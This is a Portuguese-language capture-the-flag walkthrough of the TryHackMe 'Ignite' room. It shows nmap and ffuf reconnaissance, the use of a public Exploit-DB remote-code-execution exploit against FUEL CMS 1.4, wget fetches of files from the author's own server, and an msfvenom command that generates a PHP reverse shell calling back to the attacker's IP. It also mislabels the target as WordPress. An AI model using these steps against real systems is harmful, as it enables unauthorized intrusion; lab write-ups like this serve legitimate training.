---
title: 'TryHackMe: Ignite'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Nmap, Ffuf]
image:
  path: assets/images/tryhackme/ignite/image.png
---

## Nmap

Abrindo o site Já podemos encontrar muitas informações. Está rodando um CMS mal configurado, e lendo um pouco descobri a existência da rota /fuel:

![alt text](assets/images/tryhackme/ignite/image2.png)

![alt text](assets/images/tryhackme/ignite/image3.png)

Entrando na rota e colocando o login e a senha temos acesso ao painel de admin. Isso pode ser usado mais tarde, por exemplo se um exploit precisar do acesso ao painel de admin para funcionar.

![alt text](assets/images/tryhackme/ignite/image4.png)

Vamos começar com aquele Nmap padrão:

```

nmap -sC -sV -T4 -sS -Pn -A -p- 10.10.97.246   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 06:25 -03
Stats: 0:06:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 45.48% done; ETC: 06:38 (0:07:15 remaining)
Stats: 0:12:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 92.08% done; ETC: 06:38 (0:01:05 remaining)
Nmap scan report for 10.10.97.246
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/13%OT=80%CT=1%CU=43989%PV=Y%DS=2%DC=T%G=Y%TM=67ADBDC
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%
OS:CI=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=106%G
OS:CD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M5
OS:08NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF
OS:%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   263.32 ms 10.8.0.1
2   263.45 ms 10.10.97.246

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 859.82 seconds


```

Vamos fazer também uma enumeração de subdiretórios com Ffuf:

```

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.10.97.246/FUZZ -c -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.97.246/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 16595, Words: 770, Lines: 232, Duration: 309ms]
| URL | http://10.10.97.246/0
    * FUZZ: 0

[Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 7985ms]
| URL | http://10.10.97.246/.htaccess
    * FUZZ: .htaccess

[Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 207ms]
| URL | http://10.10.97.246/.htpasswd
    * FUZZ: .htpasswd

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 321ms]
| URL | http://10.10.97.246/assets
| --> | http://10.10.97.246/assets/
    * FUZZ: assets

[Status: 200, Size: 16595, Words: 770, Lines: 232, Duration: 219ms]
| URL | http://10.10.97.246/home
    * FUZZ: home

[Status: 200, Size: 16595, Words: 770, Lines: 232, Duration: 221ms]
| URL | http://10.10.97.246/index
    * FUZZ: index

[Status: 200, Size: 70, Words: 8, Lines: 2, Duration: 267ms]
| URL | http://10.10.97.246/offline
    * FUZZ: offline

[Status: 200, Size: 30, Words: 3, Lines: 2, Duration: 236ms]
| URL | http://10.10.97.246/robots.txt
    * FUZZ: robots.txt

[Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 240ms]
| URL | http://10.10.97.246/server-status
    * FUZZ: server-status

[Status: 200, Size: 398, Words: 13, Lines: 12, Duration: 5522ms]
| URL | http://10.10.97.246/sitemap_xml
    * FUZZ: sitemap_xml

:: Progress: [20478/20478] :: Job [1/1] :: 177 req/sec :: Duration: [0:03:16] :: Errors: 0 ::

```

```
Essas rotas não me trouxeram nada promissor, então só me resta pesquisar se existe algum CVE que faça o exploit do FUEL CMS na versão 1.4: https://www.exploit-db.com/exploits/50477 Baixando o arquivo .py e rodando e colocando os argumentos necessários consegui atacar o alvo e acessar um terminal que não é 100% iterativo, não consigo sair da pasta do servidor apache (usar o comando cd), então provavelmente temos que subir algum arquivo malicioso no servidor e executar chamando a rota do arquivo. (forçando o servidor a rodar o arquivo.) vou tentar com um arquivo .sh primeiro.
```

vou subir o apache na minha máquina para servir arquivos
```
sudo systemctl start apache2
```

agora vou entrar em /var/www/html e vou criar o arquivo usando nano teste.sh
```
nano teste.sh
#!/bin/bash
echo "Hello, World!"
```

agora vou entrar na máquina vítima e dar um wget no meu ip / esse arquivo. ./teste.sh não rodou. vou testar com um arquivo php afinal de contas o servidor dele roda em cima de wordpress. Ok, como eu estou mandando comandos remotos talvez eu não tenha permissão para executar nada porém o servidor provavelmente tem permissão maior que eu. Se eu forçar o servidor a executar o arquivo eu posso logar com permissão maior. O servidor é wordpress logo ele executa PHP. Ele só não executou meu script com o comando remoto pois eu não tinha permissão olhe o print:

![alt text](assets/images/tryhackme/ignite/image6.png)

Então vou forçar rodar o arquivo chamando o arquivo através do meu navegador. Observe os dois próximos prints:

![alt text](assets/images/tryhackme/ignite/image7.png)

O servidor não executou o print acima. Acredito que nem faça sentido executar pois é wordpress, php etc...

Agora o arquivo em php ele executou:

![alt text](assets/images/tryhackme/ignite/image8.png)

Então vamos criar uma reverse shell utilizando PHP para que eu possa ter um cmd melhor. Vou usar o comando para gerar o código php: (peguei desse site: https://www.revshells.com/)

```
msfvenom -p php/reverse_php LHOST=10.8.18.71 LPORT=4242 -o shell.php
```

![alt text](assets/images/tryhackme/ignite/image9.png)

Engraçado, nem precisei chamar no navegador o arquivo para executar. Talvez o código gerado pelo msfvenom já se auto execute ao entrar.